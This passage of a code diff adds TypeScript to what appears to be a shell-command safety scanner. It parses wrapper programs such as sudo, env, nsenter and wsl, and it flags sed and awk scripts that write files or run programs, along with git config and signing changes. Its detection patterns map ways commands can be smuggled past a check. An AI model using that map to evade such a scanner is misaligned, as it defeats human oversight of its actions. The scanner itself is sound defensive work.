+      while (command === 's' && at < length && /[gpiImM\dew]/.test(script[at] as string)) {
+        if (script[at] === 'e' || script[at] === 'w') return true;
+        at++;
+      }
+    } else if ('lLqQ'.includes(command)) {
+      blanks();
+      while (at < length && /\d/.test(script[at] as string)) at++;
+    } else if (!'=dDgGhHnNpPxzF'.includes(command)) {
+      return true;
+    }
+    blanks();
+    if (at < length && !/[;\n}#]/.test(script[at] as string)) return true;
+  }
+}
+
+/** Whether an awk program writes, pipes or reads a file or runs a program of its own. */
+export function awkProgramActs(program: string): boolean {
+  return /\bsystem\s*\(|\|\s*&?\s*getline|\bgetline\b[^;{}\n]*<|\bprintf?\b[^;{}\n]*[>|]|@(include|load)\b/.test(
+    program
+  );
+}
+
+/** A word's value when the scan can read it whole, else null. */
+function staticWord(raw: string): string | null {
+  const pieces = wordPieces(raw);
+  return pieces.every(piece => 'char' in piece)
+    ? pieces.map(piece => ('char' in piece ? piece.char : '')).join('')
+    : null;
+}
+
+/**
+ * Whether a sed or awk call runs a script the scan cannot vouch for: one that writes, reads or runs
+ * something itself, a script file, an expanded script, or `sed -s`.
+ */
+function runsOpaqueScript(program: string, args: readonly string[]): boolean {
+  const sed = program === 'sed' || program === 'gsed';
+  const awk = ['awk', 'gawk', 'mawk', 'nawk'].includes(program);
+  if (!sed && !awk) return false;
+  const scripts: string[] = [];
+  let given = false;
+  let positional = false;
+  for (let index = 0; index < args.length; index++) {
+    const arg = staticWord(args[index] as string);
+    // Before the script is known, an expanded word may be it.
+    if (arg === null) {
+      if (!given) return true;
+      continue;
+    }
+    const next = (): string | null => {
+      const value = args[++index];
+      return value === undefined ? null : staticWord(value);
+    };
+    if (arg === '--') {
+      positional = true;
+      continue;
+    }
+    if (!positional && arg.startsWith('--')) {
+      const [name = '', value] = arg.slice(2).split(/=(.*)/s);
+      if (sed && (name === 'file' || name === 'separate')) return true;
+      if (awk && ['file', 'exec', 'load'].includes(name)) return true;
+      if (awk && name === 'include' && (value ?? next()) !== 'inplace') return true;
+      if ((sed && name === 'expression') || (awk && name === 'source')) {
+        const script = value ?? next();
+        if (script === null) return true;
+        scripts.push(script);
+        given = true;
+      }
+      continue;
+    }
+    if (!positional && arg.length > 1 && arg.startsWith('-')) {
+      for (let at = 1; at < arg.length; at++) {
+        const letter = arg[at] as string;
+        const rest = arg.slice(at + 1);
+        if (sed && (letter === 'f' || letter === 's')) return true;
+        if (awk && 'fEl'.includes(letter)) return true;
+        if (sed && letter === 'i') break;
+        if (letter === 'e') {
+          const script = rest || next();
+          if (script === null) return true;
+          scripts.push(script);
+          given = true;
+          break;
+        }
+        if (awk && letter === 'i') {
+          if ((rest || next()) !== 'inplace') return true;
+          break;
+        }
+        if ((sed && letter === 'l') || (awk && 'Fv'.includes(letter))) {
+          if (!rest) index++;
+          break;
+        }
+      }
+      continue;
+    }
+    if (!given) {
+      scripts.push(arg);
+      given = true;
+    }
+  }
+  return scripts.some(script => (sed ? sedScriptActs(script) : awkProgramActs(script)));
+}
+
+/**
+ * A Windows path split into a device prefix Windows takes literally and the rest: `\\?\C:\x` and
+ * `\\.\UNC\server\share` name `C:\x` and `\\server\share`, and `\\?\Volume{...}\x` keeps its `\\?\`.
+ */
+function windowsDevicePath(text: string): [string, string] {
+  if (!/^[\\/]{2}[?.][\\/]/.test(text)) return ['', text];
+  const rest = text.slice(4);
+  if (/^UNC[\\/]/i.test(rest)) return ['', `\\\\${rest.slice(4)}`];
+  return /^[A-Za-z]:/.test(rest) ? ['', rest] : [text.slice(0, 4), rest];
+}
+
+/**
+ * A program that runs the command after its own words. Any option letter not listed is a flag that
+ * takes no value.
+ */
+interface Wrapper {
+  /** Letters whose value is the rest of their word, or the next word when they end it. */
+  values: string;
+  /** Letters whose optional value is only ever the rest of their word. */
+  glued?: string;
+  /** Long options whose value is the next word unless written with `=`. */
+  long?: readonly string[];
+  /** Long options that take no value in the next word, so an abbreviation can be told from one of `long`. */
+  flags?: readonly string[];
+  /** Whether `NAME=value` words after the options set the command's environment. */
+  assignments?: boolean;
+  /** Words after the options that come before the command: timeout's duration. */
+  operands?: number;
+  /** Option letters that make it describe the command instead of running it: `command -v`. */
+  describes?: string;
+  /** Whole option words whose value is the next word (`arch -arch x86_64`); any other option word takes none. */
+  words?: readonly string[];
+  /** Options whose value is the folder the command runs in: `env -C`, `sudo --chdir`. */
+  chdir?: WrapperOptions;
+  /** Options whose value is a file it writes: `strace -o`. */
+  output?: WrapperOptions;
+  /** Options that hand it a shell string, a new root or a namespace the scan cannot follow. */
+  unread?: WrapperOptions;
+  /** It runs the command against another root or view of the files, whatever its options. */
+  elsewhere?: true;
+  /** Options without which the words after it are not a command: `runuser -u`. */
+  needs?: WrapperOptions;
+}
+
+interface WrapperOptions {
+  letters?: string;
+  long?: readonly string[];
+}
+
+const TIMEOUT_WRAPPER: Wrapper = {
+  values: 'ks',
+  long: ['kill-after', 'signal'],
+  flags: ['foreground', 'help', 'preserve-status', 'verbose', 'version'],
+  operands: 1,
+};
+
+const WRAPPERS: ReadonlyMap<string, Wrapper> = new Map([
+  [
+    'sudo',
+    {
+      values: 'aCcDgpRrTtUu',
+      glued: 'h',
+      long: [
+        'auth-type',
+        'chdir',
+        'chroot',
+        'close-from',
+        'command-timeout',
+        'group',
+        'host',
+        'login-class',
+        'other-user',
+        'prompt',
+        'role',
+        'type',
+        'user',
+      ],
+      flags: [
+        'askpass',
+        'background',
+        'bell',
+        'edit',
+        'help',
+        'list',
+        'login',
+        'no-update',
+        'non-interactive',
+        'preserve-env',
+        'preserve-groups',
+        'remove-timestamp',
+        'reset-timestamp',
+        'set-home',
+        'shell',
+        'stdin',
+        'validate',
+        'version',
+      ],
+      assignments: true,
+      chdir: { letters: 'D', long: ['chdir'] },
+      // `-s` and `-i` hand the command to a shell as one string; `-e` edits files instead of running one.
+      unread: { letters: 'Rise', long: ['chroot', 'shell', 'login', 'edit'] },
+    },
+  ],
+  [
+    'env',
+    {
+      values: 'CPSafu',
+      chdir: { letters: 'C', long: ['chdir'] },
+      long: ['argv0', 'chdir', 'file', 'split-string', 'unset'],
+      flags: [
+        'block-signal',
+        'debug',
+        'default-signal',
+        'help',
+        'ignore-environment',
+        'ignore-signal',
+        'list-signal-handling',
+        'null',
+        'version',
+      ],
+      assignments: true,
+    },
+  ],
+  ['command', { values: '', describes: 'vV' }],
+  // bash's `coproc` runs a simple command in the background; it takes no options.
+  ['coproc', { values: '', words: [] }],
+  ['exec', { values: 'a' }],
+  ['nohup', { values: '', flags: ['help', 'version'] }],
+  // bash's `time` keyword times a whole simple command, assignments included.
+  [
+    'time',
+    {
+      values: 'fo',
+      long: ['format', 'output'],
+      flags: ['append', 'help', 'portability', 'quiet', 'verbose', 'version'],
+      assignments: true,
+      output: { letters: 'o', long: ['output'] },
+    },
+  ],
+  ['nice', { values: 'n', long: ['adjustment'], flags: ['help', 'version'] }],
+  ['timeout', TIMEOUT_WRAPPER],
+  // Homebrew's coreutils name for GNU timeout.
+  ['gtimeout', TIMEOUT_WRAPPER],
+  [
+    'xargs',
+    {
+      // `J`, `R` and `S` are macOS xargs; GNU refuses them.
+      values: 'EIJLPRSadns',
+      glued: 'eil',
+      long: ['arg-file', 'delimiter', 'max-args', 'max-chars', 'max-procs', 'process-slot-var'],
+      flags: [
+        'eof',
+        'exit',
+        'help',
+        'interactive',
+        'max-lines',
+        'no-run-if-empty',
+        'null',
+        'open-tty',
+        'replace',
+        'show-limits',
+        'verbose',
+        'version',
+      ],
+    },
+  ],
+  ['stdbuf', { values: 'ioe', long: ['input', 'output', 'error'], flags: ['help', 'version'] }],
+  [
+    'ionice',
+    {
+      values: 'cnpPu',
+      long: ['class', 'classdata', 'pid', 'pgid', 'uid'],
+      flags: ['ignore', 'help', 'version'],
+    },
+  ],
+  ['setsid', { values: '', flags: ['ctty', 'fork', 'wait', 'help', 'version'] }],
+  [
+    'flock',
+    {
+      values: 'wEc',
+      long: ['timeout', 'wait', 'conflict-exit-code', 'command'],
+      flags: ['shared', 'exclusive', 'unlock', 'nonblock', 'nb', 'close', 'no-fork', 'verbose', 'help', 'version'],
+      operands: 1,
+      unread: { letters: 'c', long: ['command'] },
+    },
+  ],
+  [
+    'chrt',
+    {
+      values: 'TPD',
+      long: ['sched-runtime', 'sched-period', 'sched-deadline'],
+      flags: ['all-tasks', 'batch', 'deadline', 'fifo', 'idle', 'other', 'rr', 'reset-on-fork', 'max', 'pid'],
+      operands: 1,
+    },
+  ],
+  ['taskset', { values: '', flags: ['all-tasks', 'cpu-list', 'pid', 'help', 'version'], operands: 1 }],
+  [
+    'nsenter',
+    {
+      values: 'tNSGW',
+      glued: 'muinpCUTrw',
+      long: ['target', 'net-socket', 'setuid', 'setgid', 'wdns'],
+      flags: ['all', 'root', 'wd', 'mount', 'uts', 'ipc', 'net', 'pid', 'cgroup', 'user', 'time', 'no-fork'],
+      elsewhere: true,
+    },
+  ],
+  [
+    'unshare',
+    {
+      values: 'RwSGl',
+      glued: 'muinpUCT',
+      long: ['root', 'wd', 'setuid', 'setgid', 'load-interp', 'map-user', 'map-group', 'propagation', 'setgroups'],
+      flags: ['mount', 'uts', 'ipc', 'net', 'pid', 'user', 'cgroup', 'time', 'fork', 'map-root-user', 'mount-proc'],
+      unread: { letters: 'Rw', long: ['root', 'wd'] },
+    },
+  ],
+  [
+    'chroot',
+    {
+      values: '',
+      long: ['userspec', 'groups'],
+      flags: ['skip-chdir', 'help', 'version'],
+      operands: 1,
+      elsewhere: true,
+    },
+  ],
+  ['doas', { values: 'Cu' }],
+  [
+    'runuser',
+    {
+      values: 'cgGsuw',
+      long: ['command', 'group', 'supp-group', 'shell', 'user', 'whitelist-environment', 'session-command'],
+      flags: ['login', 'preserve-environment', 'pty', 'fast', 'help', 'version'],
+      unread: { letters: 'c', long: ['command', 'session-command'] },
+      needs: { letters: 'u', long: ['user'] },
+    },
+  ],
+  ['busybox', { values: '' }],
+  ['toybox', { values: '' }],
+  [
+    'strace',
+    {
+      values: 'abeEIoOpPsSuUX',
+      long: ['output', 'attach', 'trace-path', 'string-limit', 'summary-sort-by', 'user', 'env', 'columns'],
+      output: { letters: 'o', long: ['output'] },
+    },
+  ],
+  [
+    'ltrace',
+    {
+      values: 'aADeFlnopsuwx',
+      long: ['output', 'config', 'library', 'indent', 'align'],
+      output: { letters: 'o', long: ['output'] },
+    },
+  ],
+  // valgrind takes only `--name=value`, so `--log-file` is listed for its value, never the next word.
+  ['valgrind', { values: '', output: { long: ['log-file', 'xml-file'] } }],
+  [
+    'faketime',
+    {
+      values: 'p',
+      long: ['date-prog'],
+      flags: ['exclude-monotonic', 'help', 'version'],
+      operands: 1,
+      unread: { long: ['date-prog'] },
+    },
+  ],
+  [
+    'numactl',
+    {
+      values: 'imNCpPwL',
+      long: [
+        'interleave',
+        'membind',
+        'cpunodebind',
+        'physcpubind',
+        'preferred',
+        'preferred-many',
+        'weighted-interleave',
+        'length',
+        'offset',
+        'shmmode',
+        'shmid',
+        'shm',
+        'file',
+      ],
+      flags: ['all', 'balancing', 'localalloc', 'show', 'hardware', 'strict', 'touch', 'huge', 'dump', 'dump-nodes'],
+    },
+  ],
+  ['eatmydata', { values: '' }],
+  [
+    'fakeroot',
+    {
+      values: 'lisb',
+      long: ['lib', 'faked'],
+      flags: ['unknown-is-real', 'help', 'version'],
+      output: { letters: 's' },
+    },
+  ],
+  ['unbuffer', { values: '' }],
+  ['caffeinate', { values: 'tw' }],
+  ['arch', { values: '', words: ['-arch', '-d', '-e'] }],
+  [
+    'wsl',
+    {
+      values: 'du',
+      long: ['cd', 'distribution', 'distribution-id', 'shell-type', 'user'],
+      flags: ['exec', 'system'],
+    },
+  ],
+]);
+
+const NO_OPTIONS: Wrapper = { values: '' };
+
+/** Launchers that take wsl's own arguments, so the scan reads them as `wsl`. */
+const WSL_ALIASES = new Set(['wslg']);
+
+/** A program's name as the scan looks it up: `/usr/bin/curl`, `curl.exe` and `CURL.EXE` are all `curl`; so is `npx.cmd` `npx`, and `wslg.exe` is `wsl`. */
+export const programName = (executable: string): string => {
+  const name = basename(executable)
+    .toLowerCase()
+    .replace(/\.(exe|cmd|bat)$/, '');
+  return WSL_ALIASES.has(name) ? 'wsl' : name;
+};
+
+/** Whether a word names a wrapper (`sudo`, `/usr/bin/env`). */
+export const isWrapper = (word: string): boolean => WRAPPERS.has(programName(unquote(word)));
+
+/** The long option `given` names, read as getopt_long reads it: an exact name, or an abbreviation of exactly one. */
+function longOptionName(wrapper: Wrapper, given: string): string | undefined {
+  const names = [...(wrapper.long ?? []), ...(wrapper.flags ?? [])];
+  if (names.includes(given)) return given;
+  const named = names.filter(option => option.startsWith(given));
+  return named.length === 1 ? named[0] : undefined;
+}
+
+/**
+ * Whether long option `given` takes the next word. getopt_long refuses an ambiguous abbreviation; it
+ * is read as a flag, so a program named right after it is still found.
+ */
+function longTakesValue(wrapper: Wrapper, given: string): boolean {
+  const name = longOptionName(wrapper, given);
+  return name !== undefined && (wrapper.long ?? []).includes(name);
+}
+
+/** How many words one of a wrapper's options spans: two when its value is the next word. */
+function optionWords(wrapper: Wrapper, word: string): 1 | 2 {
+  if (wrapper.words) return wrapper.words.includes(word) ? 2 : 1;
+  if (word.startsWith('--')) return !word.includes('=') && longTakesValue(wrapper, word.slice(2)) ? 2 : 1;
+  // A value letter ends the cluster: `-Eu bob` and `-ubob` are both `-E -u bob`.
+  for (let at = 1; at < word.length; at++) {
+    if (wrapper.glued?.includes(word[at])) return 1;
+    if (wrapper.values.includes(word[at])) return at === word.length - 1 ? 2 : 1;
+  }
+  return 1;
+}
+
+/**
+ * The words of `name`'s options that start at `from`, as indices into `tokens`, and where its own words
+ * (options, their values and, for env and sudo, assignments) end.
+ */
+function wrapperWords(name: string, tokens: readonly string[], from: number): { options: number[]; end: number } {
+  const wrapper = WRAPPERS.get(name) ?? NO_OPTIONS;
+  const options: number[] = [];
+  let at = from;
+  let reading = true;
+  while (at < tokens.length) {
+    const word = unquote(tokens[at]);
+    if (reading && word === '--') {
+      reading = false;
+      at++;
+    } else if (reading && word.startsWith('-')) {
+      options.push(at);
+      at += optionWords(wrapper, word);
+    } else if (wrapper.assignments && /^[A-Za-z_][A-Za-z0-9_]*=/.test(word)) {
+      at++;
+    } else {
+      break;
+    }
+  }
+  return { options, end: Math.min(at, tokens.length) };
+}
+
+/**
+ * The index past the wrapper at `tokens[at]` and its own words: options and their values, assignments, timeout's
+ * duration. The end of `tokens` when the wrapper runs nothing.
+ */
+export function pastWrapper(tokens: readonly string[], at: number): number {
+  const name = programName(unquote(tokens[at] ?? ''));
+  const wrapper = WRAPPERS.get(name);
+  const { options, end } = wrapperWords(name, tokens, at + 1);
+  const describes = wrapper?.describes ?? '';
+  const describing = options
+    .map(index => unquote(tokens[index]))
+    .some(word => /^-[^-]/.test(word) && [...word.slice(1)].some(letter => describes.includes(letter)));
+  return describing ? tokens.length : Math.min(end + (wrapper?.operands ?? 0), tokens.length);
+}
+
+/** Where the command a run of leading wrappers (`sudo`, `env X=1`, `timeout 5`) runs starts in `tokens`. */
+function wrappedStart(tokens: readonly string[]): number {
+  let start = 0;
+  while (start < tokens.length && isWrapper(tokens[start])) start = pastWrapper(tokens, start);
+  return start;
+}
+
+/** Whether one of env's option words is `-S` (`--split-string`), which reads its value as a command line. */
+function splitsString(word: string): boolean {
+  const env = WRAPPERS.get('env') ?? NO_OPTIONS;
+  if (word.startsWith('--')) return longOptionName(env, word.slice(2).split('=')[0]) === 'split-string';
+  return [...word.slice(1)].find(letter => env.values.includes(letter)) === 'S';
+}
+
+export interface SplitString {
+  /** The index of the `env` in the tokens. */
+  env: number;
+  /** The index of its `-S` word. */
+  option: number;
+  /** The command line env runs: itself, the value it splits, and the words after that value. */
+  command: string;
+}
+
+/**
+ * The value given to the wrapper option at `tokens[at]`, as written, and the index past it: after its `=`, after
+ * `letter` in a short cluster, or the next word.
+ */
+function optionArgument(
+  tokens: readonly string[],
+  at: number,
+  letter: string
+): { value: string | undefined; next: number } {
+  const word = unquote(tokens[at]);
+  const glued = word.startsWith('--')
+    ? word.includes('=')
+      ? word.slice(word.indexOf('=') + 1)
+      : undefined
+    : word.slice(word.indexOf(letter) + 1) || undefined;
+  return glued === undefined ? { value: tokens[at + 1], next: at + 2 } : { value: glued, next: at + 1 };
+}
+
+/** wsl's options that report on WSL itself instead of starting a distro. */
+const WSL_REPORTS = new Set(['-l', '--list', '-v', '--version', '--status', '--help']);
+
+/** What `ungranted` holds for a wsl run in a distro the command does not name: the default one, or one by id. */
+export const UNNAMED_DISTRO = 'a WSL distro the command does not name';
+
+/** What `ungranted` holds for a wsl run with `--system`, which starts the WSL system distro. */
+export const SYSTEM_DISTRO = 'the WSL system distro';
+
+/** What `ungranted` holds for a wsl run with an option that manages WSL itself, such as `--shutdown`. */
+export const WSL_MANAGEMENT = 'a wsl option that manages WSL itself';
+
+/** wsl's options that run a command in a distro; any other, such as `--shutdown`, manages WSL itself. */
+const WSL_RUNS = new Set([
+  'd',
+  'u',
+  'e',
+  'cd',
+  'distribution',
+  'distribution-id',
+  'user',
+  'exec',
+  'shell-type',
+  'system',
+]);
+
+interface WslRun {
+  /** The index of the `wsl` word, and the index past its own options. */
+  at: number;
+  end: number;
+  /** The distro each `-d` names, undefined for one the text does not name; none given reads as the default distro. */
+  distros: (string | undefined)[];
+  /** Whether `-e` hands the words after its options to a program, not to the distro's shell as a command line. */
+  exec: boolean;
+  /** Whether `--system` starts the system distro, and whether an option outside `WSL_RUNS` is given. */
+  system: boolean;
+  managing: boolean;
+}
+
+/** Each `wsl` in a run of leading wrappers that starts a distro. */
+function wslRuns(tokens: readonly string[]): WslRun[] {
+  const wsl = WRAPPERS.get('wsl') ?? NO_OPTIONS;
+  const runs: WslRun[] = [];
+  for (let at = 0; at < tokens.length && isWrapper(tokens[at]); at = pastWrapper(tokens, at)) {
+    if (programName(unquote(tokens[at])) !== 'wsl') continue;
+    const { options, end } = wrapperWords('wsl', tokens, at + 1);
+    if (WSL_REPORTS.has(unquote(tokens[options[0]] ?? ''))) break;
+    const distros: (string | undefined)[] = [];
+    let exec = false;
+    let system = false;
+    let managing = false;
+    for (const index of options) {
+      if (exec) break;
+      const word = unquote(tokens[index]);
+      const name = word.startsWith('--') ? longOptionName(wsl, word.slice(2).split('=')[0]) : word.slice(1, 2);
+      if (name === undefined || !WSL_RUNS.has(name)) managing = true;
+      if (name === 'e' || name === 'exec') exec = true;
+      if (name === 'system') system = true;
+      if (name === 'distribution-id') distros.push(undefined);
+      if (name !== 'd' && name !== 'distribution') continue;
+      const { value } = optionArgument(tokens, index, 'd');
+      distros.push(value === undefined || isDynamic(value) ? undefined : unquote(value));
+    }
+    runs.push({ at, end, distros: distros.length > 0 ? distros : [undefined], exec, system, managing });
+  }
+  return runs;
+}
+
+/** Variables that hand git other config, or another repository, than the scan's git reads (PATH is checked apart). */
+const ALIAS_VARIABLE =
+  /^(GIT_(DIR|WORK_TREE|COMMON_DIR|EXEC_PATH|CEILING_DIRECTORIES|DISCOVERY_ACROSS_FILESYSTEM|CONFIG\w*)|HOME|XDG_CONFIG_HOME)$/;
+
+/** The variables that move the user config files git reads, as a script may set them. */
+const SCRIPT_GIT_ENVIRONMENT = /^(HOME|XDG_CONFIG_HOME|GIT_CONFIG_(NOSYSTEM|GLOBAL|SYSTEM))$/;
+const SCRIPT_GIT_ENVIRONMENT_NAMES = [
+  'HOME',
+  'XDG_CONFIG_HOME',
+  'GIT_CONFIG_GLOBAL',
+  'GIT_CONFIG_SYSTEM',
+  'GIT_CONFIG_NOSYSTEM',
+];
+
+const GIT_ENVIRONMENT_NAME = /^(HOME|XDG_CONFIG_HOME|GIT_CONFIG\w*)$/;
+
+/** Whether a word names, or as an expansion or glob may name, a variable git reads user config through. */
+function mayNameGitEnvironment(raw: string): boolean {
+  const active = wordPieces(raw).some(piece => 'char' in piece && piece.active && '*?[{'.includes(piece.char));
+  return isDynamic(raw) || active || variableNames(GIT_ENVIRONMENT_NAME).test(wordValue(raw));
+}
+
+const nameOf = (raw: string): string => (raw.includes('=') ? raw.slice(0, raw.indexOf('=')) : raw);
+const valueOf = (raw: string): string => raw.slice(raw.indexOf('=') + 1);
+
+/** Whether a builtin drops, shadows or redirects the export of a variable git reads user config through. */
+function builtinDrops(program: string, args: readonly string[]): boolean {
+  const options: string[] = [];
+  const operands: string[] = [];
+  let ended = false;
+  for (const arg of args) {
+    const text = wordValue(arg);
+    if (!ended && text === '--') ended = true;
+    else if (!ended && /^[-+]./.test(text)) options.push(arg);
+    else operands.push(arg);
+  }
+  if (program === 'unset' || program === 'unsetenv') return operands.some(mayNameGitEnvironment);
+  if (program === 'local') return operands.some(operand => mayNameGitEnvironment(nameOf(operand)));
+  if (!['export', 'declare', 'typeset'].includes(program)) return false;
+  const flag = program === 'export' ? /^-[A-Za-z]*n/ : /^(\+[A-Za-z]*x|-[A-Za-z]*n)/;
+  // A bare expansion may hold the option.
+  const unknown = operands.some(operand => !operand.includes('=') && /^["']?[$`]/.test(operand));
+  if (!options.some(option => isDynamic(option) || flag.test(wordValue(option))) && !unknown) return false;
+  const nameref = options.some(option => /^-[A-Za-z]*n/.test(wordValue(option)));
+  return operands.some(
+    operand =>
+      mayNameGitEnvironment(nameOf(operand)) ||
+      (nameref && operand.includes('=') && mayNameGitEnvironment(valueOf(operand)))
+  );
+}
+
+/** Whether the `env` at `raw[at]` clears the environment or unsets a variable git reads user config through. */
+function envDrops(raw: readonly string[], at: number): boolean {
+  const env = WRAPPERS.get('env') ?? NO_OPTIONS;
+  // Options end at the first word that is not one: a command, a NAME=VALUE word, or `--`.
+  for (let index = at + 1; index < raw.length; index++) {
+    const text = raw[index] as string;
+    const word = wordValue(text);
+    if (word === '-' || /^["']?[$`]/.test(text)) return true;
+    if (!word.startsWith('-') || word === '--') return false;
+    if (word.startsWith('--')) {
+      const given = word.slice(2).split('=')[0] as string;
+      const name = longOptionName(env, given) ?? given;
+      if (name === 'ignore-environment') return true;
+      const glued = word.includes('=');
+      if (name === 'unset' && mayNameGitEnvironment(glued ? valueOf(text) : (raw[index + 1] ?? '$'))) return true;
+      if (!glued && longTakesValue(env, given)) index++;
+      continue;
+    }
+    for (let letter = 1; letter < word.length; letter++) {
+      const char = word[letter] as string;
+      if (char === 'i') return true;
+      if (!env.values.includes(char)) continue;
+      const rest = word.slice(letter + 1) !== '';
+      const value = rest ? text.slice(text.indexOf(char) + 1) : (raw[index + 1] ?? '$');
+      if (char === 'u' && mayNameGitEnvironment(value)) return true;
+      if (!rest) index++;
+      break;
+    }
+  }
+  return false;
+}
+
+/** Whether a command's words, past its wrappers, drop a git environment variable; `code` is the text it may run as shell code. */
+function commandDrops(raw: readonly string[], code: string): boolean {
+  const split = splitString(raw);
+  if (split !== null && commandDrops(split.command.split(/\s+/), code)) return true;
+  let at = 0;
+  while (at < raw.length) {
+    const word = raw[at] as string;
+    if (wordValue(word) === 'builtin') {
+      at++;
+      continue;
+    }
+    if (!isWrapper(word)) break;
+    if (programName(wordValue(word)) === 'env' && envDrops(raw, at)) return true;
+    const end = pastWrapper(raw, at);
+    if (end <= at) break;
+    at = end;
+  }
+  const program = wordValue(raw[at] ?? '');
+  if (builtinDrops(program, raw.slice(at + 1))) return true;
+  const readsCode = READS_SHELL_CODE.has(program) || XARGS_SHELLS.has(programName(program));
+  return readsCode && code !== '' && codeDrops(code);
+}
+
+const CODE_STARTS = /^(unset|unsetenv|export|declare|typeset|local|env|builtin)$/;
+
+/** Shell code in a string or on stdin is not parsed, so its words are read by command position. */
+function codeDrops(code: string): boolean {
+  for (const segment of code.replace(/['"]/g, '').split(/[;&|\n(){}`]+/)) {
+    const tokens = segment.split(/\s+/).filter(Boolean);
+    for (let start = 0; start < tokens.length; start++) {
+      const word = tokens[start] as string;
+      if ((CODE_STARTS.test(word) || isWrapper(word)) && commandDrops(tokens.slice(start), '')) return true;
+    }
+  }
+  return false;
+}
+
+/**
+ * Whether a script unsets HOME, XDG_CONFIG_HOME or a GIT_CONFIG* variable (`unset`, `export -n`, `declare +x`, `local`,
+ * `env -u`, `env -i`), or an operand it cannot read; nothing tracks an unset, so the value git sees is unknown.
+ */
+function unsetsGitEnvironment(root: Node): boolean {
+  for (const node of root.descendantsOfType(['command', 'declaration_command', 'unset_command'])) {
+    if (node === null) continue;
+    const raw = node.type === 'command' ? words(node) : declarationWords(node);
+    const whole = node.parent?.type === 'redirected_statement' ? node.parent : node;
+    if (commandDrops(raw, whole.text)) return true;
+  }
+  return false;
+}
+
+/**
+ * What a statement may change for a later config query: `signing` a key that can turn signing on, set or removed as
+ * the script spells it; `branch` the branch an includeIf onbranch reads; `place` the repository a folder holds (init,
+ * clone, a cd to a folder not there yet); `any` other config, or config the scan cannot read.
+ */
+type HistoryChange = 'signing' | 'any' | 'branch' | 'place';
+
+/**
+ * Why a git call may sign or verify. Signing settings and unresolved signing configuration require fresh consent.
+ * The marker also prevents an earlier unsigned allowance from covering a newly selected verifier.
+ */
+interface SigningFinding {
+  text: string;
+  asks: boolean;
+}
+
+/** Why a git call is not one gitTable lists: `signing` when it signs or verifies (gitSigningRisk). */
+interface GitReason {
+  kind: 'unlisted' | 'signing';
+  reason: string;
+}
+
+/** Config keys whose value can turn signing or verifying on, change what log prints, or move an include. */
+const SIGNING_CONFIG_KEY = /^(commit|tag|merge|log|push|pretty|include|includeif|gpg)\.|^format\.pretty$/i;
+const SIGNING_SECTION = /^(commit|tag|merge|log|push|pretty|include|includeif|gpg|format)(\.|$)/i;
+/** What an includeIf hasconfig:remote condition matches. */
+const REMOTE_URL_KEY = /^remote\..*\.(url|pushurl)$/i;
+
+/** What a `git config` call (words after `config`, unquoted) changes for a later config query; null for a read or an unrelated key. */
+function configChange(rest: readonly string[]): HistoryChange | null {
+  const { operands, reads, edits, removes, adds } = gitConfigWords(rest);
+  if (reads) return null;
+  const [verb = ''] = operands;
+  if (edits || verb === 'edit') return 'any';
+  const dynamic = (word: string): boolean => /[$`]/.test(word);
+  if (/^(rename|remove)-section$/.test(verb) || rest.some(arg => /^--(rename|remove)-section$/.test(arg))) {
+    const sections = /-section$/.test(verb) ? operands.slice(1) : operands;
+    if (sections.some(section => !dynamic(section) && SIGNING_SECTION.test(section))) return 'signing';
+    return sections.some(section => dynamic(section) || /^remote(\.|$)/i.test(section)) ? 'any' : null;
+  }
+  if (/^(get|list)$/.test(verb)) return null;
+  const verbed = /^(set|unset)$/.test(verb);
+  // `git config KEY` reads the key.
+  if (!verbed && !removes && !adds && operands.length < 2) return null;
+  const key = operands[verbed ? 1 : 0];
+  if (key === undefined || dynamic(key)) return 'any';
+  if (SIGNING_CONFIG_KEY.test(key)) return 'signing';
+  // A word filled at run time may split into options that change which key is written.
+  if (rest.some(dynamic) || REMOTE_URL_KEY.test(key)) return 'any';
+  return /[\s\\"'*?[\]{}()<>|;&~!]/.test(key) || !/^[^.]+(\..+)?\.[^.]+$/.test(key) ? 'any' : null;
+}
+
+/**
+ * What git run as `sub` with `rest` (unquoted) may change for a later config query: it writes config, makes a
+ * repository or switches the branch or worktree an includeIf condition reads.
+ */
+function historyChange(sub: string, rest: readonly string[]): HistoryChange | null {
+  const args = rest.slice(0, rest.includes('--') ? rest.indexOf('--') : rest.length);
+  if (sub === 'init' || sub === 'clone') {
+    const settings = rest.flatMap((arg, at) =>
+      /^(-[^-]*c|--config)$/.test(arg) ? [rest[at + 1] ?? ''] : /^--config=/.test(arg) ? [arg.slice(9)] : []
+    );
+    if (settings.some(setting => SIGNING_CONFIG_KEY.test(setting.split('=')[0] as string))) return 'signing';
+    // A template, `--config` or `-c` gives the new repository config of its own.
+    return rest.some(arg => /^(--template|--config|--separate-git-dir|--git-dir)|^-[^-]*c/.test(arg)) ? 'any' : 'place';
+  }
+  // Restoring paths after `--` leaves HEAD where it is.
+  const separator = rest.indexOf('--');
+  if (
+    sub === 'checkout' &&
+    separator !== -1 &&
+    rest.slice(0, separator).every(arg => /^(-q|--quiet|-f|--force)$/.test(arg))
+  ) {
+    return null;
+  }
+  if (['switch', 'checkout', 'rebase', 'bisect'].includes(sub)) return 'branch';
+  if (sub === 'config') return configChange(rest);
+  if (sub === 'remote') {
+    return /^(add|rename|remove|rm|set-url|set-branches)$/.test(args.find(arg => !arg.startsWith('-')) ?? '')
+      ? 'any'
+      : null;
+  }
+  if (sub === 'worktree') return args[0] === 'add' ? 'any' : null;
+  if (sub === 'stash') return args[0] === 'branch' ? 'branch' : null;
+  if (sub === 'branch') {
+    return args.some(arg => /^--(move|copy)$/.test(arg) || (/^-[^-]/.test(arg) && /[mMcC]/.test(arg)))
+      ? 'branch'
+      : null;
+  }
+  if (sub === 'symbolic-ref') {
+    return args.filter(arg => !arg.startsWith('-')).length >= 2 || args.some(arg => /^(-d|--delete)$/.test(arg))
+      ? 'branch'
+      : null;
+  }
+  return null;
+}
+
+/** The options git reads before its subcommand that take a value, which gitPlace places or hands on to a config query. */
+const GIT_GLOBAL_VALUES = new Set(['-C', '-c', '--config-env', '--git-dir', '--work-tree']);
+
+/** A script text that unsets or unexports the variables carrying the shell's own git config, or names them by expansion. */
+const UNSETS_GIT_CONFIG = /\b(unset|export\s+-n)\b[^;&|\n]*(GIT_CONFIG|[$`])/;
+
+/** Programs, besides the shells, that read a string as shell code. */
+const READS_SHELL_CODE = new Set(['eval', 'trap', 'source', '.', 'alias']);
+
+/**
+ * Whether the script runs `unset` or `export -n` on a variable of the shell's git config (or one it cannot name),
+ * read from the parsed commands; code a shell reads from a string, or from stdin, is matched as text.
+ */
+function unsetsGitConfig(root: Node, gateText: string): boolean {
+  let readsCode = false;
+  for (const node of root.descendantsOfType(['command', 'declaration_command', 'unset_command'])) {
